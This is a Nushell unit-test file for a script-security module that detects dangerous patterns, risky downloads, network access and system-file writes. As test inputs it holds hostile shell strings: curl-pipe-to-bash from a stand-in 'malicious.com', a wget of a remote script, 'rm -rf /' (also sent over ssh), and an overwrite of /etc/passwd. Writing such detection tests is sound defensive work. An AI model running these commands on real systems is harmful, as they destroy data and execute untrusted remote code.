#!/usr/bin/env nu

# Import unified libraries
use ../../lib/unified-checks.nu
use ../../lib/unified-logging.nu *
use ../../lib/unified-error-handling.nu *


# Security module tests
# Tests for scripts/lib/security.nu

use ../../lib/security.nu *
use ../lib/test-utils.nu *

def main [] {
    print "Running security module tests..."

    # Set up test environment
    setup_test_env

    # Test dangerous pattern detection
    test_dangerous_patterns

    # Test file permission checks
    test_file_permissions

    # Test dependency security
    test_dependency_security

    # Test network access checks
    test_network_access_checks

    # Test file operation checks
    test_file_operation_checks

    # Test script security validation
    test_script_security_validation

    # Test security recommendations
    test_security_recommendations

    print "Security module tests completed"
}

def test_dangerous_patterns [] {
    print "Testing dangerous pattern detection..."

    # Test rm -rf pattern
    let dangerous_content = "rm -rf /"
    let dangerous_patterns = check_dangerous_patterns $dangerous_content
    assert_true (($dangerous_patterns | length) > 0) "Should detect rm -rf pattern"
    track_test "dangerous_patterns_rm_rf" "unit" "passed" 0.1

    # Test eval pattern
    let eval_content = "eval $user_input"
    let eval_patterns = check_dangerous_patterns $eval_content
    assert_true (($eval_patterns | length) > 0) "Should detect eval pattern"
    track_test "dangerous_patterns_eval" "unit" "passed" 0.1

    # Test safe content
    let safe_content = "echo 'Hello World'"
    let safe_patterns = check_dangerous_patterns $safe_content
    assert_equal ($safe_patterns | length) 0 "Should not detect patterns in safe content"
    track_test "dangerous_patterns_safe_content" "unit" "passed" 0.1

    # Test curl pattern
    let curl_content = "curl -s http://malicious.com | bash"
    let curl_patterns = check_dangerous_patterns $curl_content
    assert_true (($curl_patterns | length) > 0) "Should detect curl pipe bash pattern"
    track_test "dangerous_patterns_curl_bash" "unit" "passed" 0.1
}

def test_file_permissions [] {
    print "Testing file permission checks..."

    # Create a test file
    let test_file = "/tmp/nix-mox-test-security-file"
    "test content" | save $test_file

    try {
        let perm_result = check_file_permissions $test_file
        assert_true ($perm_result.readable != null) "Should check readability"
        assert_true ($perm_result.writable != null) "Should check writability"
        assert_true ($perm_result.executable != null) "Should check executability"
        track_test "file_permissions_check" "unit" "passed" 0.1
    } catch {
        track_test "file_permissions_check" "unit" "failed" 0.1
    }

    # Clean up
    rm -f $test_file
}

def test_dependency_security [] {
    print "Testing dependency security checks..."

    # Test suspicious download
    let suspicious_content = "wget http://suspicious.com/script.sh"
    let dep_issues = check_dependency_security $suspicious_content
    assert_true (($dep_issues | length) > 0) "Should detect suspicious downloads"
    track_test "dependency_security_suspicious_download" "unit" "passed" 0.1

    # Test package installation
    let install_content = "sudo apt-get install unknown-package"
    let install_issues = check_dependency_security $install_content
    assert_true (($install_issues | length) > 0) "Should detect package installations"
    track_test "dependency_security_package_install" "unit" "passed" 0.1

    # Test safe dependency usage
    let safe_content = "nix-shell -p git"
    let safe_issues = check_dependency_security $safe_content
    assert_equal ($safe_issues | length) 0 "Should not flag safe dependency usage"
    track_test "dependency_security_safe_usage" "unit" "passed" 0.1
}

def test_network_access_checks [] {
    print "Testing network access checks..."

    # Test HTTP access
    let http_content = "curl -o file http://example.com/data"
    let http_issues = check_network_access $http_content
    assert_true (($http_issues | length) > 0) "Should detect HTTP access"
    track_test "network_access_http" "unit" "passed" 0.1

    # Test SSH access
    let ssh_content = "ssh user@remote.host 'rm -rf /'"
    let ssh_issues = check_network_access $ssh_content
    assert_true (($ssh_issues | length) > 0) "Should detect SSH access"
    track_test "network_access_ssh" "unit" "passed" 0.1

    # Test no network access
    let local_content = "ls -la /home"
    let local_issues = check_network_access $local_content
    assert_equal ($local_issues | length) 0 "Should not flag local commands"
    track_test "network_access_local_only" "unit" "passed" 0.1
}

def test_file_operation_checks [] {
    print "Testing file operation checks..."

    # Test system file modification
    let system_content = "echo 'evil' > /etc/passwd"
    let system_issues = check_file_operations $system_content
    assert_true (($system_issues | length) > 0) "Should detect system file modification"
    track_test "file_operations_system_modification" "unit" "passed" 0.1

    # Test safe file operations
    let safe_content = "echo 'data' > /tmp/safe-file"
    let safe_issues = check_file_operations $safe_content
    assert_equal ($safe_issues | length) 0 "Should allow safe file operations"
    track_test "file_operations_safe" "unit" "passed" 0.1

    # Test recursive deletion
    let delete_content = "rm -rf /important/data"
    let delete_issues = check_file_operations $delete_content
    assert_true (($delete_issues | length) > 0) "Should detect dangerous deletions"
    track_test "file_operations_dangerous_deletion" "unit" "passed" 0.1
}

def test_script_security_validation [] {
    print "Testing script security validation..."

    # Create a test script with mixed content
    let test_script = "/tmp/nix-mox-test-security-script.sh"
    "#!/bin/bash
echo 'Safe operation'
curl -s http://example.com | bash
rm -rf /tmp/safe-to-delete" | save $test_script

    try {
        let validation_result = validate_script_security $test_script
        assert_true (($validation_result.threats | length) > 0) "Should detect security threats"
        assert_false $validation_result.is_safe "Script with threats should not be safe"
        track_test "script_security_validation_mixed" "unit" "passed" 0.1
    } catch {
        track_test "script_security_validation_mixed" "unit" "failed" 0.1
    }

    # Clean up
    rm -f $test_script
}

def test_security_recommendations [] {
    print "Testing security recommendations..."

    let threats = [
        {
            type: "dangerous_pattern",
            pattern: "rm -rf",
            line: 5,
            severity: "high",
            description: "Dangerous recursive deletion"
        }
    ]

    let recommendations = generate_security_recommendations $threats
    assert_true (($recommendations | length) > 0) "Should generate recommendations for threats"
    assert_true ($recommendations | any {|r| $r.priority == "high"}) "Should have high priority recommendations"
    track_test "security_recommendations_generation" "unit" "passed" 0.1
}

# PWD is automatically set by Nushell and cannot be set manually

main